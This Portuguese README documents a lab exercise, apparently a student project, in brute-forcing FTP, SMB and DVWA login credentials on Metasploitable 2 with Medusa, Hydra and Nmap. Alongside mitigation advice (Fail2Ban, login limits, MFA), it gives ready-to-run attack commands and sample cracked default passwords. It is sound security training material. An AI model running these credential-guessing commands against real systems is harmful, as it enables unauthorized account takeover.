 Ataque de Força Bruta com Medusa e Kali Linux

> Projeto prático de teste de segurança em ambiente controlado, documentando ataques de força bruta e medidas de mitigação.
Objetivo Demonstrar compreensão de ataques de força bruta, ferramentas de auditoria e práticas de defesa.


📋 Índice

1. [Descrição do Projeto]
2. [Ambiente de Teste]
3. [Ferramentas Utilizadas]
4. [Cenários de Ataque]
5. [Execução dos Testes]
6. [Resultados Obtidos]
7. [Medidas de Mitigação]
8. [Conclusões]
9. [Referências]


📖 Descrição do Projeto

Este projeto implementa e documenta ataques de força bruta controlados em um ambiente de laboratório para fins educacionais. Utilizando o Kali Linux como máquina atacante e Metasploitable 2 como alvo, foram testados cenários de ataque contra:

- FTP (File Transfer Protocol)
- Aplicações Web (DVWA - Damn Vulnerable Web Application)
- SMB (Server Message Block)

O objetivo é compreender vulnerabilidades, testar defesas e documentar boas práticas de segurança.

Aviso Legal: Este projeto é exclusivamente para fins educacionais em ambiente controlado e autorizado.

🖥️ Ambiente de Teste

Configuração de Hardware/Software

| Componente | Especificação |
|-----------|---------------|
| Hipervisor | VirtualBox 7.x |
| Rede | Host-Only (isolada da rede externa) |
| VM 1 (Atacante) | Kali Linux 2024.x (4GB RAM, 30GB disco) |
| VM 2 (Alvo | Metasploitable 2 (2GB RAM, 20GB disco) |
| Serviços Vulneráveis | FTP, HTTP (DVWA), SMB |

 Passos de Configuração

 1. Criar as Máquinas Virtuais

```bash
# No VirtualBox:
# 1. Nova VM > Linux > Kali Linux (ISO baixada de https://www.kali.org/get-kali/)
# 2. Nova VM > Linux > Metasploitable 2 (ISO de https://sourceforge.net/projects/metasploitable/)
```

 2. Configurar Rede Host-Only

```bash
# VirtualBox > Preferences > Network > Host-only Networks
# Criar rede: vboxnet0 (192.168.56.0/24)
# Atribuir a ambas as VMs
```

 3. Verificar Conectividade

```bash
# Na VM Kali:
ping 192.168.56.101  # IP do Metasploitable 2
```

🛠️ Ferramentas Utilizadas

Medusa

Descrição: Ferramenta de ataque de força bruta paralelo, suporta múltiplos protocolos.

Instalação:
```bash
sudo apt-get update
sudo apt-get install medusa
```

Protocolos Suportados: FTP, SSH, HTTP, SMB, IMAP, LDAP, POP3, VNC, e muitos outros.

Nmap

Descrição: Scanner de rede para identificação de serviços abertos.

Instalação:
```bash
sudo apt-get install nmap
```

Hydra

Descrição: Alternativa ao Medusa para ataques de força bruta.

Instalação:
```bash
sudo apt-get install hydra
```

DVWA

Descrição: Aplicação web vulnerável para testes de segurança.

Acesso: `http://192.168.56.101/dvwa/` (Credenciais padrão: admin/password)

🎯 Cenários de Ataque

Cenário 1: Força Bruta em FTP

Objetivo: Ganhar acesso ao serviço FTP via força bruta de credenciais.

Serviço: FTP (porta 21)  
Alvo: Metasploitable 2  
Wordlist: `senhas-simples.txt`

Comando:
```bash
medusa -h 192.168.56.101 -u msfadmin -P wordlists/senhas-simples.txt -M ftp -f
```

Resultado Esperado: Descobrir a senha `msfadmin`



Cenário 2: Força Bruta em Formulário Web (DVWA)

Objetivo: Testar autenticação da aplicação DVWA.

Serviço: HTTP (porta 80)  
Alvo: DVWA  
Método: POST no formulário de login  

Comando com Hydra:
```bash
hydra -l admin -P wordlists/senhas-simples.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

Resultado Esperado: Descobrir a senha padrão `password`



Cenário 3: Enumeração e Password Spraying em SMB

Objetivo: Enumerar usuários e testar acesso via SMB.

Serviço: SMB (portas 139, 445)  
Alvo: Metasploitable 2

Passo 1 - Enumerar usuários:
```bash
nmap -p 139,445 --script smb-enum-users 192.168.56.101
```

Passo 2 - Força bruta SMB:
```bash
medusa -h 192.168.56.101 -U usuarios.txt -P wordlists/senhas-simples.txt -M smbnt -f
```

Resultado Esperado: Acesso com credenciais válidas


🚀 Execução dos Testes

Preparação

1. Iniciar ambas as VMs e garantir conectividade de rede
2. Verificar serviços ativos no Metasploitable 2:
   ```bash
   nmap -p- 192.168.56.101
   ```
3. Criar wordlists na pasta `wordlists/`

Teste 1: FTP

```bash
# Terminal Kali
cd ~/brute-force-project
medusa -h 192.168.56.101 -u msfadmin -P wordlists/senhas-simples.txt -M ftp -f -v 6
```

Documentar:
- ✅ Comando executado
- ✅ Tempo de execução
- ✅ Credenciais descobertas
- ✅ Captura de tela

Teste 2: DVWA

```bash
# Terminal Kali
hydra -l admin -P wordlists/senhas-simples.txt 192.168.56.101 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 4 -v
```

Documentar:
- ✅ URL do formulário
- ✅ Parâmetros POST
- ✅ Mensagem de erro
- ✅ Resultado

Teste 3: SMB

```bash
# Enumeração
nmap -p 139,445 --script smb-enum-users 192.168.56.101

# Força bruta
medusa -h 192.168.56.101 -U usuarios.txt -P wordlists/senhas-simples.txt -M smbnt -f -v 6
```

Documentar:
- ✅ Usuários enumerados
- ✅ Credenciais válidas
- ✅ Tempo total


📊 Resultados Obtidos

> Preencha com seus resultados reais

FTP

| Usuário | Senha | Status |
|---------|-------|--------|
| msfadmin | msfadmin | ✅ Sucesso |
| root | toor | ✅ Sucesso |

Evidência:
```
[*] Medusa v2.2 [http://www.foofus.net/jmk/medusa/medusa.html] (C) JoMo-Kun & Co. 2013
[*] Target: 192.168.56.101 Port: 21
[*] Module: FTP v2.0
[*] Attempting: msfadmin : msfadmin on 192.168.56.101:21...
[+] [192.168.56.101:21] [FTP] Host: 192.168.56.101 User: msfadmin Password: msfadmin
```

DVWA

| Usuário | Senha | Status |
|---------|-------|--------|
| admin | password | ✅ Sucesso |

SMB

| Usuário | Senha | Status |
|---------|-------|--------|
| root | (sem senha) | ✅ Sucesso |


🛡️ Medidas de Mitigação

1. Política de Senhas Forte

```bash
# Linux (etc/login.defs)
PASS_MAX_DAYS   90
PASS_MIN_DAYS   1
PASS_WARN_AGE   7
PASS_MIN_LEN    12
```

Implementação:
- Mínimo 12 caracteres
- Combinação de maiúsculas, minúsculas, números e símbolos
- Alteração obrigatória a cada 90 dias

2. Limite de Tentativas de Login

```bash
# SSH (/etc/ssh/sshd_config)
MaxAuthTries 3
MaxSessions 10
LoginGraceTime 30
```

```bash
# FTP (vsftpd.conf)
max_clients=100
max_per_ip=5
```

3. Bloqueio Automático (Fail2Ban)

```bash
sudo apt-get install fail2ban

# /etc/fail2ban/jail.local
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 5

[sshd]
enabled = true
```

4. Monitoramento e Alertas

```bash
# Ativar auditoria
sudo auditctl -w /var/log/auth.log -p wa -k auth_changes

# Analisar tentativas falhadas
grep "Failed password" /var/log/auth.log | wc -l
```

5. Autenticação Multifator (MFA)

```bash
sudo apt-get install libpam-google-authenticator
sudo google-authenticator
```

6. Desabilitar Serviços Desnecessários

```bash
# Exemplo: desabilitar FTP se não usar
sudo systemctl disable vsftpd
sudo systemctl stop vsftpd
```

💡 Conclusões

Aprendizados Principais

1. Vulnerabilidades Identificadas:
   - Senhas padrão não alteradas
   - Ausência de limite de tentativas
   - Serviços desnecessários expostos

2. Efetividade de Ferramentas:
   - Medusa: eficiente para múltiplos protocolos
   - Hydra: versátil para aplicações web
   - Nmap: essencial para reconhecimento

3. Importância da Defesa em Profundidade:
   - Políticas de senha forte
   - Rate limiting
   - Monitoramento contínuo
   - Segmentação de rede

Recomendações Futuras

- ✅ Implementar WAF (Web Application Firewall)
- ✅ Utilizar chaves SSH em vez de senha
- ✅ Implementar VPN para acesso remoto
- ✅ Realizar testes periódicos de penetração
- ✅ Manter logs centralizados e monitorados

📚 Referências

- [Kali Linux Official Documentation](https://www.kali.org/)
- [Medusa - Foofus.net](http://www.foofus.net/jmk/medusa/medusa.html)
- [DVWA](http://www.dvwa.co.uk/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Metasploitable 2 on SourceForge](https://sourceforge.net/projects/metasploitable/)

[senhas-simples.txt](https://github.com/user-attachments/files/27562894/senhas-simples.txt)
[usuarios.txt](https://github.com/user-attachments/files/27562895/usuarios.txt)
